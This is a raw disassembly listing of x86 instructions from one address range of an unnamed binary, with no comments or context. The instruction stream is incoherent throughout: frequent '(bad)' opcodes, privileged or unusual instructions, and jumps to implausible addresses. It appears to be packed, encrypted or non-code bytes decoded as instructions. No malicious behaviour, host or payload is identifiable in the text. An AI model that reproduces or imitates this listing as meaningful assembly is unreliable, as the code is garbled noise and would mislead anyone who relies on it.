  427600:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  427608:	test   DWORD PTR [eax],edi
  42760a:	clc    
  42760b:	pushf  
  42760c:	inc    ebp
  42760d:	dec    DWORD PTR [ebx-0x3cba0f04]
  427613:	push   eax
  427614:	(bad)  
  427615:	cld    
  427616:	jge    0x427618
  427618:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  42761e:	add    BYTE PTR [ebx],dl
  427620:	jmp    0xcd7772
  427625:	les    eax,FWORD PTR [ebp-0x35]
  427628:	mov    ecx,esi
  42762a:	lock or al,cl
  42762d:	clc    
  42762e:	inc    ebp
  42762f:	add    esi,DWORD PTR [ebx]
  427631:	jge    0x427636
  427633:	xor    edi,DWORD PTR [ebx]
  427635:	cmp    ecx,DWORD PTR [edi]
  427637:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42763c:	mov    edi,DWORD PTR [ecx]
  42763e:	test   al,0xcc
  427640:	dec    ebp
  427641:	test   BYTE PTR [ebx],dh
  427643:	pop    es
  427644:	xor    eax,DWORD PTR [eax]
  427646:	add    ecx,DWORD PTR [esi]
  427648:	add    ecx,eax
  42764a:	psraw  mm0,mm1
  42764d:	sub    BYTE PTR [ebp+0x38],cl
  427650:	mov    edi,DWORD PTR [ebx]
  427652:	lock int3 
  427654:	shl    edx,1
  427656:	rol    BYTE PTR [ebp+0xc],1
  427659:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427660:	jmp    0x7b76aa
  427665:	pushf  
  427666:	inc    ebp
  427667:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42766d:	xor    ecx,ebx
  42766f:	add    ecx,esi
  427671:	mov    esi,eax
  427673:	enter  0x45af,0x8b
  427677:	xor    ecx,eax
  427679:	add    edx,DWORD PTR [ebp-0x77]
  42767c:	sub    ecx,DWORD PTR [eax]
  42767e:	cmp    eax,DWORD PTR [ebp+0x77]
  427681:	fmul   DWORD PTR [ebx-0x76385764]
  427687:	test   al,0x0
  427689:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42768f:	cmp    esi,DWORD PTR [ebx]
  427691:	pushf  
  427692:	xor    eax,edi
  427694:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42769b:	inc    ebp
  42769c:	dec    ebp
  42769d:	cmp    eax,0xc7f09c8b
  4276a2:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  4276a9:	inc    ebp
  4276aa:	jmp    0x4276eb
  4276ac:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  4276b3:	dec    ebp
  4276b4:	xor    esi,DWORD PTR [ebx]
  4276b6:	add    eax,DWORD PTR [ebx]
  4276b8:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4276be:	dec    ebp
  4276bf:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276c5:	out    dx,eax
  4276c6:	rol    BYTE PTR [eax],1
  4276c8:	add    eax,0xebc8458b
  4276cd:	dec    ebp
  4276ce:	mov    ebp,DWORD PTR [ebx]
  4276d0:	mov    esp,0x33f84d8b
  4276d5:	ret    
  4276d6:	xor    eax,esi
  4276d8:	add    ecx,eax
  4276da:	add    eax,DWORD PTR [edx+0xc1010f]
  4276e0:	dec    ebp
  4276e1:	inc    ebp
  4276e2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276e8:	ror    bl,1
  4276ea:	add    eax,0xebc645ce
  4276ef:	scas   eax,DWORD PTR es:[edi]
  4276f0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276f6:	xor    ebp,DWORD PTR [ebx]
  4276f8:	xor    edi,DWORD PTR [ebx]
  4276fa:	add    esi,DWORD PTR [edi+0x3]
  4276fd:	mov    ecx,DWORD PTR [edi]
  4276ff:	clc    
  427700:	rol    ebx,0x4d
  427703:	(bad)  
  427704:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  42770b:	mov    ah,0x45
  42770d:	dec    ebp
  42770e:	jbe    0x427743
  427710:	mov    esi,DWORD PTR [ebx]
  427712:	call   0x3345c41a
  427717:	rdpmc  
  427719:	rol    DWORD PTR [ebx],0x4d
  42771c:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427722:	inc    ebp
  427723:	ror    BYTE PTR [ebx+0x45450808],1
  427729:	jmp    0x10a77b9
  42772e:	inc    ebp
  42772f:	inc    ebp
  427730:	(bad)  
  427731:	mov    ebx,eax
  427733:	clc    
  427734:	test   ebx,eax
  427736:	clc    
  427737:	retf   
  427738:	inc    ebp
  427739:	into   
  42773a:	mov    esi,0x8b85afec
  427740:	clc    
  427741:	enter  0x5545,0x3a
  427745:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42774c:	ret    
  42774d:	mov    ah,0xc6
  42774f:	addr16 push 0x338b4545
  427755:	clc    
  427756:	add    eax,ebx
  427758:	loopne 0x427725
  42775a:	dec    ebp
  42775b:	into   
  42775c:	mov    al,dh
  42775e:	or     BYTE PTR [edi-0x37ff748e],ch
  427764:	inc    ebp
  427765:	push   ebp
  427766:	mov    ebp,DWORD PTR [ebx]
  427768:	in     al,dx
  427769:	cmp    eax,ebx
  42776b:	ja     0x4277b2
  42776d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427773:	inc    ebp
  427774:	cwde   
  427775:	mov    esi,DWORD PTR [edx]
  427777:	clc    
  427778:	mov    bl,al
  42777a:	xlat   BYTE PTR ds:[ebx]
  42777b:	retf   
  42777c:	inc    ebp
  42777d:	into   
  42777e:	mov    eax,esi
  427780:	in     al,dx
  427781:	scas   eax,DWORD PTR es:[edi]
  427782:	retf   
  427783:	mov    ecx,DWORD PTR [ebp-0x38]
  427786:	mov    edx,DWORD PTR [ebp-0x24]
  427789:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427790:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427797:	mov    eax,DWORD PTR [ebx]
  427799:	clc    
  42779a:	loopne 0x42775f
  42779c:	push   ebp
  42779d:	retf   
  42779e:	mov    dh,al
  4277a0:	adc    esi,ecx
  4277a2:	jb     0x427753
  4277a4:	add    BYTE PTR [ebx+0x558bc845],cl
  4277aa:	in     al,dx
  4277ab:	sub    eax,ebx
  4277ad:	cmp    ecx,ebx
  4277af:	mov    eax,esi
  4277b1:	mov    esp,0x45af03ce
  4277b6:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4277bc:	mov    eax,ebx
  4277be:	in     al,dx
  4277bf:	into   
  4277c0:	dec    ebp
  4277c1:	(bad)  
  4277c2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277c8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277cc:	xor    esp,esp
  4277ce:	sub    eax,DWORD PTR [ebp-0x75]
  4277d1:	add    ebp,esp
  4277d3:	mov    al,0x55
  4277d5:	inc    ebp
  4277d6:	xor    edi,DWORD PTR [eax]
  4277d8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277df:	inc    ebp
  4277e0:	xor    edi,DWORD PTR [ecx]
  4277e2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277e9:	test   DWORD PTR [eax],eax
  4277eb:	clc    
  4277ec:	enter  0x8645,0x33
  4277f0:	inc    DWORD PTR [ebx]
  4277f2:	(bad)  
  4277f3:	jmp    0x42783a
  4277f5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277fb:	inc    ebp
  4277fc:	(bad)  
  4277fd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  427803:	cwde   
  427804:	retf   
  427805:	xor    al,cl
  427807:	mov    BYTE PTR [ebp+0xb],cl
  42780a:	lea    eax,[ebp+0x8]
  42780d:	xor    esi,DWORD PTR [edx+0x3]
  427810:	add    al,ah
  427812:	inc    ebp
  427813:	dec    ebp
  427814:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  42781a:	push   0x2b45cd00
  42781f:	mov    al,BYTE PTR [ebx]
  427821:	or     esi,eax
  427823:	dec    ebp
  427824:	inc    ebp
  427825:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42782b:	push   ebp
  42782c:	(bad)  
  42782d:	mov    BYTE PTR [edi+0xf723b11],ch
  427833:	add    ch,ch
  427835:	inc    ebp
  427836:	dec    DWORD PTR [ebx-0x34332775]
  42783c:	add    al,0x4d
  42783e:	inc    ebp
  42783f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427845:	cwde   
  427846:	add    DWORD PTR [edx],esi
  427848:	add    BYTE PTR [ebx+0x4d00c000],cl
  42784e:	push   DWORD PTR [ebx]
  427850:	int3   
  427851:	xor    eax,DWORD PTR [eax]
  427853:	add    edx,DWORD PTR [eax+0x3]
  427856:	mov    DWORD PTR [edi],ecx
  427858:	call   0x4288391e
  42785d:	mov    DWORD PTR [ebp-0x20],esp
  427860:	add    BYTE PTR [ebp+0x7d],al
  427863:	mov    eax,DWORD PTR [eax]
  427865:	in     al,0x15
  427867:	ret    
  427868:	iret   
  427869:	(bad)  
  42786a:	enter  0x14af,0x8b
  42786e:	(bad)  
  42786f:	in     al,dx
  427870:	or     bl,cl
  427872:	adc    cl,al
  427874:	push   ebp
  427875:	dec    ebp
  427876:	inc    eax
  427877:	mov    edx,DWORD PTR [ebp-0x20]
  42787a:	jb     0x427847
  42787c:	mov    ecx,esi
  42787e:	cld    
  42787f:	scas   eax,DWORD PTR es:[edi]
  427880:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427887:	mov    BYTE PTR [eax],0x8c
  42788a:	push   0xffffff98
  42788c:	push   edi
  42788d:	xor    dl,BYTE PTR [eax+0x3b]
  427890:	mov    ecx,DWORD PTR [edi]
  427892:	call   0x8c41bdf5
  427897:	mov    eax,eax
  427899:	in     al,dx
  42789a:	jge    0x4278e9
  42789c:	mov    DWORD PTR [ebx],esi
  42789e:	int3   
  42789f:	add    eax,DWORD PTR [ebp+0xf]
  4278a2:	xor    eax,ecx
  4278a4:	(bad)  
  4278a5:	dec    ebp
  4278a6:	pushf  
  4278a7:	xor    ecx,eax
  4278a9:	add    edi,DWORD PTR [edi]
  4278ab:	mov    eax,DWORD PTR [ebp-0x38]
  4278ae:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  4278b5:	mov    DWORD PTR [edx+0xf4505c8],ecx
  4278bb:	xor    edx,DWORD PTR [ecx+edi*4]
  4278be:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278c5:	dec    ebp
  4278c6:	leave  
  4278c7:	mov    edx,ecx
  4278c9:	rol    BYTE PTR [ebp+0x330155],1
  4278cf:	add    ecx,DWORD PTR [ebp+0xf]
  4278d2:	xor    eax,edx
  4278d4:	(bad)  
  4278d5:	ror    DWORD PTR [eax],0x86
  4278d8:	jb     0x4278d7
  4278da:	add    bh,bh
  4278dc:	clc    
  4278dd:	inc    ebp
  4278de:	jb     0x42794a
  4278e0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278e6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278ec:	shr    BYTE PTR [eax-0x3d],0x30
  4278f0:	clc    
  4278f1:	add    BYTE PTR [ebp+0x75],al
  4278f4:	cmp    BYTE PTR [edx-0x64],ch
  4278f7:	inc    edi
  4278f9:	adc    al,0xe8
  4278fb:	inc    ebp
  4278fc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  427902:	mov    ecx,DWORD PTR [eax]
  427904:	cld    
  427905:	or     DWORD PTR [ebp-0x34],0x33
  427909:	jbe    0x42790e
  42790b:	mov    edx,DWORD PTR [ecx+0x2b]
  42790e:	dec    ebp
  42790f:	mov    cl,BYTE PTR [ebx+0x45d801]
  427915:	mov    BYTE PTR [ebx],dh
  427917:	mov    eax,DWORD PTR [ebx]
  427919:	or     BYTE PTR [ecx+0x3b],dl
  42791c:	dec    ebp
  42791d:	int3   
  42791e:	xor    ebp,edi
  427920:	add    eax,DWORD PTR [ebp+0x51]
  427923:	mov    ecx,DWORD PTR [ebp-0x28]
  427926:	xor    eax,DWORD PTR [eax]
  427928:	add    ebp,DWORD PTR [eax+0x51]
  42792b:	adc    BYTE PTR [eax+0x0],0x8b
  42792f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427935:	inc    ebp
  427936:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42793c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427942:	dec    ebp
  427943:	mov    esi,DWORD PTR [ebx]
  427945:	hlt    
  427946:	add    eax,ebx
  427948:	push   ecx
  427949:	inc    ebp
  42794a:	dec    ebp
  42794b:	sar    bh,1
  42794d:	shl    ah,1
  42794f:	(bad)  
  427950:	retf   
  427951:	mov    al,ds:0xc5ff3dce
  427956:	adc    al,0xc6
  427958:	inc    ebp
  427959:	and    eax,0x9c0f4c85
  42795e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427965:	cmp    BYTE PTR [ebx+0x3b],0x0
  427969:	mov    dh,0xc7
  42796b:	cmp    eax,eax
  42796d:	jne    0x454371b9
  427973:	mov    edi,DWORD PTR [edx]
  427975:	mov    eax,0x848bcb9c
  42797a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427981:	or     BYTE PTR [edi],cl
  427983:	(bad)  
  427984:	dec    ebp
  427985:	inc    edi
  427986:	add    bh,0x50
  427989:	or     cl,ch
  42798b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427991:	xchg   DWORD PTR [eax-0x1638af64],eax
  427997:	mov    esp,0xf802b588
  42799c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42799d:	inc    ebp
  42799e:	(bad)  
  42799f:	cmp    al,0xff
  4279a1:	pushf  
  4279a2:	or     DWORD PTR [ecx+0x45ffe474],0x0
  4279a9:	mov    ecx,DWORD PTR [ebp-0x340018]
  4279af:	into   
  4279b0:	dec    DWORD PTR [ebx-0x7f72431c]
  4279b6:	push   0x5000ff01
  4279bb:	retf   
  4279bc:	inc    ebp
  4279bd:	into   
  4279be:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279c4:	push   eax
  4279c5:	into   
  4279c6:	call   0x4a7e56
  4279cb:	retf   
  4279cc:	add    dh,cl
  4279ce:	add    bh,bh
  4279d0:	mov    DWORD PTR [eax+ecx*1],edx
  4279d3:	clc    
  4279d4:	inc    ebp
  4279d5:	inc    ebp
  4279d6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279dc:	push   0x1
  4279de:	push   edi
  4279df:	add    BYTE PTR [eax-0x35],dl
  4279e2:	mov    ecx,esi
  4279e4:	cld    
  4279e5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279eb:	into   
  4279ec:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279f3:	xor    eax,DWORD PTR [ebp+0x3]
  4279f6:	jne    0x427a49
  4279f8:	call   DWORD PTR [eax-0x3c]
  4279fb:	mov    DWORD PTR [ecx-0x18],edx
  4279fe:	mov    edi,edi
  427a00:	call   0x8b45bf89
  427a05:	add    ah,ah
  427a07:	rol    BYTE PTR [ebp-0x7c],0xeb
  427a0b:	add    edi,edi
  427a0d:	add    al,ch
  427a0f:	inc    ebp
  427a10:	push   ecx
  427a11:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  427a17:	mov    al,0xc7
  427a19:	test   esp,esp
  427a1b:	clc    
  427a1c:	test   DWORD PTR [ebp-0x8],ecx
  427a1f:	add    BYTE PTR [ebp+0x50],0x39
  427a23:	jmp    0x8bcc02c4
  427a28:	in     al,dx
  427a29:	or     BYTE PTR [ebp-0xf],al
  427a2c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a32:	hlt    
  427a33:	mov    eax,DWORD PTR [ebp-0x50]
  427a36:	xor    esi,ecx
  427a38:	add    eax,DWORD PTR [eax+0x4f086889]
  427a3e:	inc    ebp
  427a3f:	sbb    eax,0x68
  427a42:	pushf  
  427a43:	inc    edi
  427a45:	add    al,ch
  427a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a48:	test   edi,edi
  427a4a:	clc    
  427a4b:	inc    DWORD PTR [ebp-0x73]
  427a4e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a52:	(bad)  
  427a53:	push   ecx
  427a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a55:	jne    0x4279dc
  427a57:	push   eax
  427a58:	clc    
  427a59:	test   DWORD PTR [ebp-0x1],eax
  427a5c:	cmp    eax,0xc78b9cff
  427a61:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a68:	inc    ebp
  427a69:	push   edi
  427a6a:	aas    
  427a6b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a72:	dec    ebp
  427a73:	add    BYTE PTR [ebx],dh
  427a75:	inc    ebp
  427a76:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a7c:	enter  0x8401,0x0
  427a80:	add    al,BYTE PTR [eax]
  427a82:	add    bh,bh
  427a84:	out    dx,eax
  427a85:	sbb    BYTE PTR [eax],al
  427a87:	dec    ebp
  427a88:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a8e:	sub    esi,DWORD PTR [ebx]
  427a90:	mov    ebp,DWORD PTR [eax-0x8]
  427a93:	add    bl,0x0
  427a96:	(bad)  
  427a97:	cmp    eax,ecx
  427a99:	or     BYTE PTR [edx+0x750114],al
  427a9f:	inc    DWORD PTR [ebp+0x18]
  427aa2:	mov    eax,DWORD PTR [ebp-0x8]
  427aa5:	mov    ebx,eax
  427aa7:	(bad)  
  427aa8:	retf   
  427aa9:	inc    ebp
  427aaa:	into   
  427aab:	mov    esi,eax
  427aad:	int3   
  427aae:	scas   eax,DWORD PTR es:[edi]
  427aaf:	push   es
  427ab0:	mov    esi,DWORD PTR [ebp-0xc]
  427ab3:	call   DWORD PTR [ebp+0x18]
  427ab6:	sub    edi,DWORD PTR [ebp+0x3b]
  427ab9:	mov    esi,DWORD PTR [edi-0x34]
  427abc:	mov    eax,DWORD PTR [ebp-0x8]
  427abf:	cmp    bl,al
  427ac1:	pushf  
  427ac2:	mov    bh,0xbc
  427ac5:	fadd   QWORD PTR [eax]
  427ac7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427acd:	mov    esi,DWORD PTR [ebx]
  427acf:	in     al,0x33
  427ad1:	ret    
  427ad2:	add    eax,esi
  427ad4:	add    eax,DWORD PTR [ebp+0xf]
  427ad7:	mov    eax,ecx
  427ad9:	in     al,0x4d
  427adb:	ret    
  427adc:	mov    eax,esi
  427ade:	in     al,dx
  427adf:	inc    ebp
  427ae0:	rol    edi,1
  427ae2:	sar    al,1
  427ae4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aea:	add    BYTE PTR [edx],bh
  427aec:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427af3:	test   ebx,eax
  427af5:	clc    
  427af6:	retf   
  427af7:	inc    ebp
  427af8:	into   
  427af9:	cmp    al,0xc6
  427afb:	pushf  
  427afc:	scas   eax,DWORD PTR es:[edi]
  427afd:	(bad)  
  427afe:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427b05:	inc    ebp
  427b06:	cmp    edi,DWORD PTR [esi]
  427b08:	ja     0x427aa6
  427b0a:	mov    eax,edi
  427b0c:	mov    esp,0x458567a8
  427b11:	clc    
  427b12:	mov    eax,DWORD PTR [ebp-0x8]
  427b15:	mov    eax,ebx
  427b17:	in     al,dx
  427b18:	retf   
  427b19:	ret    
  427b1a:	into   
  427b1b:	mov    dh,0x7d
  427b1e:	scas   eax,DWORD PTR es:[edi]
  427b1f:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b25:	add    BYTE PTR [ebx],ch
  427b27:	jmp    0xb97c67
  427b2c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b2f:	mov    eax,DWORD PTR [ebp-0x14]
  427b32:	inc    ebp
  427b33:	enter  0x458b,0xf8
  427b37:	xor    eax,ebx
  427b39:	add    ecx,ebx
  427b3b:	cmp    ecx,esi
  427b3d:	shufps xmm7,xmm4,0xaf
  427b41:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b47:	dec    ebp
  427b48:	sub    esi,DWORD PTR [ebx]
  427b4a:	cmp    esi,DWORD PTR [ebx]
  427b4c:	ja     0x427b51
  427b4e:	mov    eax,DWORD PTR [ebx]
  427b50:	lods   al,BYTE PTR ds:[esi]
  427b51:	mov    db0,ecx
  427b54:	inc    ebp
  427b55:	dec    ebp
  427b56:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b5c:	retf   
  427b5d:	rol    dh,1
  427b5f:	or     al,0xce
  427b61:	inc    ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b69:	add    BYTE PTR [ebx],ch
  427b6b:	add    BYTE PTR [ebx],bh
  427b6d:	inc    ebp
  427b6e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b74:	inc    ebp
  427b75:	retf   
  427b76:	mov    ecx,esi
  427b78:	clc    
  427b79:	(bad)  
  427b7a:	retf   
  427b7b:	scas   eax,DWORD PTR es:[edi]
  427b7c:	ret    
  427b7d:	mov    ecx,esi
  427b7f:	hlt    
  427b80:	(bad)  
  427b81:	push   ebp
  427b82:	scas   eax,DWORD PTR es:[edi]
  427b83:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b89:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b8f:	add    BYTE PTR [ebx],al
  427b91:	mov    eax,eax
  427b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b94:	inc    ebp
  427b95:	dec    ebp
  427b96:	cmp    BYTE PTR [ebx],dh
  427b98:	pushf  
  427b99:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b9f:	(bad)  
  427ba1:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427ba9:	sar    eax,1
  427bab:	rol    BYTE PTR [ebp+0x5],1
  427bae:	xor    eax,DWORD PTR [ebp+0x3]
  427bb1:	jmp    0x427b9e
  427bb3:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427bb9:	xor    eax,DWORD PTR [ebp+0x33]
  427bbc:	mov    eax,DWORD PTR [ebx]
  427bbe:	rol    BYTE PTR [ebx],1
  427bc0:	test   BYTE PTR [edi],cl
  427bc2:	cwde   
  427bc3:	shl    DWORD PTR [edx],0x4d
  427bc6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bcc:	xor    edx,eax
  427bce:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bd4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bda:	add    BYTE PTR [ebx],dh
  427bdc:	inc    ebp
  427bdd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427be3:	rdpmc  
  427be5:	rol    DWORD PTR [ebx],0x4d
  427be8:	loopne 0x427b75
  427bea:	push   ebp
  427beb:	in     al,dx
  427bec:	mov    cl,dl
  427bee:	adc    eax,edx
  427bf0:	jb     0x427bf7
  427bf2:	add    BYTE PTR [ebp+0x45],al
  427bf5:	jmp    0x427b82
  427bf7:	mov    ebx,eax
  427bf9:	test   al,0xcb
  427bfb:	dec    ebp
  427bfc:	dec    ebp
  427bfd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427c03:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427c09:	dec    ebp
  427c0a:	mov    al,0x8b
  427c0c:	dec    ebp
  427c0d:	in     al,dx
  427c0e:	xor    edx,ecx
  427c10:	xor    edx,eax
  427c12:	add    eax,DWORD PTR [ebp+0x3]
  427c15:	jbe    0x427c26
  427c17:	mov    eax,ecx
  427c19:	test   al,0x45
  427c1b:	dec    ebp
  427c1c:	mov    DWORD PTR [ebx],esi
  427c1e:	loopne 0x427c53
  427c20:	inc    ebp
  427c21:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c27:	rol    esi,0x45
  427c2a:	scas   eax,DWORD PTR es:[edi]
  427c2b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c31:	mov    eax,ecx
  427c33:	hlt    
  427c34:	dec    ebp
  427c35:	inc    ebp
  427c36:	mov    eax,edi
  427c38:	loopne 0x427c12
  427c3a:	retf   
  427c3b:	test   esi,ecx
  427c3d:	clc    
  427c3e:	scas   eax,DWORD PTR es:[edi]
  427c3f:	inc    ebp
  427c40:	mov    eax,edi
  427c42:	fdiv   st,st(0)
  427c44:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c4a:	cwde   
  427c4b:	cmp    dh,BYTE PTR [edx]
  427c4d:	pushf  
  427c4e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c54:	inc    esi
  427c56:	mov    ebp,DWORD PTR [eax-0x10]
  427c59:	inc    ebp
  427c5a:	dec    ebp
  427c5b:	xor    esi,DWORD PTR [ebx]
  427c5d:	add    eax,DWORD PTR [ebx]
  427c5f:	loopne 0x427c70
  427c61:	dec    ebp
  427c62:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c69:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c6f:	lock cwde 
  427c71:	ret    
  427c72:	xor    al,BYTE PTR [ebp-0x77]
  427c75:	mov    esi,esp
  427c77:	rol    BYTE PTR [ebp-0x7c],1
  427c7a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c80:	call   edi
  427c82:	enter  0x4d45,0x8b
  427c86:	mov    esi,eax
  427c88:	fmul   st(3),st
  427c8a:	push   ebp
  427c8b:	dec    ebp
  427c8c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c92:	ret    0xc198
  427c95:	xor    al,BYTE PTR [esi-0x280276]
  427c9b:	dec    ebp
  427c9c:	jne    0x427cd1
  427c9e:	mov    eax,DWORD PTR [ebx]
  427ca0:	cld    
  427ca1:	loopne 0x427c53
  427ca3:	push   ebp
  427ca4:	add    DWORD PTR [eax+0x72851100],ecx
  427caa:	inc    DWORD PTR [eax]
  427cac:	inc    DWORD PTR [ebp-0x75]
  427caf:	mov    edi,esp
  427cb1:	lock add bl,0x1
  427cb5:	retf   
  427cb6:	add    dh,al
  427cb8:	xor    dh,cl
  427cba:	inc    ebp
  427cbb:	scas   eax,DWORD PTR es:[edi]
  427cbc:	mov    eax,DWORD PTR [ebx]
  427cbe:	shl    al,0x0
  427cc1:	inc    ebp
  427cc2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427cc8:	call   0x458f00
  427ccd:	ud0    eax,ecx
  427cd0:	adc    al,0x4d
  427cd2:	inc    ebp
  427cd3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cd9:	lock push 0x338055
  427cdf:	add    eax,DWORD PTR [eax]
  427ce1:	ud0    ecx,edx
  427ce4:	sbb    BYTE PTR [ebp+0x5e],dl
  427ce7:	xor    ecx,ecx
  427ce9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cf0:	push   ecx
  427cf1:	add    BYTE PTR [ebp-0x38],cl
  427cf4:	mov    DWORD PTR [esi-0x740004],eax
  427cfa:	cld    
  427cfb:	inc    ebp
  427cfc:	xchg   edx,eax
  427cfd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427d03:	xabort 0xaf
  427d06:	icebp  
  427d07:	mov    esi,DWORD PTR [ebp-0x28]
  427d0a:	(bad)  
  427d0b:	retf   
  427d0c:	or     ecx,eax
  427d0e:	(bad)  
  427d0f:	dec    ebp
  427d10:	pop    es
  427d11:	(bad)  
  427d12:	(bad)  
  427d13:	or     BYTE PTR [esi],al
  427d15:	jb     0x427cdd
  427d17:	add    BYTE PTR [ebx],al
  427d19:	inc    ebp
  427d1a:	(bad)  
  427d1b:	mov    ecx,DWORD PTR [edx]
  427d1d:	fadd   st(6),st
  427d1f:	ret    
  427d20:	add    ch,BYTE PTR [eax-0x37]
  427d23:	int    0x55
  427d25:	sub    ebp,esp
  427d27:	add    edx,DWORD PTR [ecx-0x14]
  427d2a:	inc    ebp
  427d2b:	inc    ebp
  427d2c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d32:	cld    
  427d33:	(bad)  
  427d34:	mov    gs,WORD PTR [edi+0xf893be0]
  427d3a:	mov    ebp,ebp
  427d3c:	clc    
  427d3d:	push   eax
  427d3f:	push   DWORD PTR [ebp-0x4]
  427d42:	mov    BYTE PTR [ebp+0xa],0xff
  427d46:	(bad)  
  427d47:	int3   
  427d48:	or     BYTE PTR [eax],al
  427d4a:	(bad)  
  427d4b:	lea    eax,[edi]
  427d4d:	ins    BYTE PTR es:[edi],dx
  427d4e:	(bad)  
  427d4f:	inc    DWORD PTR [ecx]
  427d51:	push   eax
  427d52:	mov    BYTE PTR [ebp+0x9],0x8b
  427d56:	leave  
  427d57:	les    edx,FWORD PTR [ebp+0x0]
  427d5a:	in     al,dx
  427d5b:	call   DWORD PTR [ecx-0x75]
  427d5e:	inc    ebp
  427d5f:	cld    
  427d60:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d66:	cld    
  427d67:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d6d:	std    
  427d6e:	mov    eax,DWORD PTR [eax]
  427d70:	clc    
  427d71:	test   eax,esi
  427d73:	je     0x427dea
  427d75:	mov    eax,esi
  427d77:	cld    
  427d78:	add    al,0x80
  427d7a:	add    WORD PTR [ecx+0x0],ax
  427d7e:	fadd   QWORD PTR [eax]
  427d80:	mov    BYTE PTR [eax],0xd0
  427d83:	push   0xffffffc3
  427d85:	push   edi
  427d86:	mov    edx,DWORD PTR [eax+0x51]
  427d89:	pop    edi
  427d8a:	lea    ebx,[ebx-0x8]
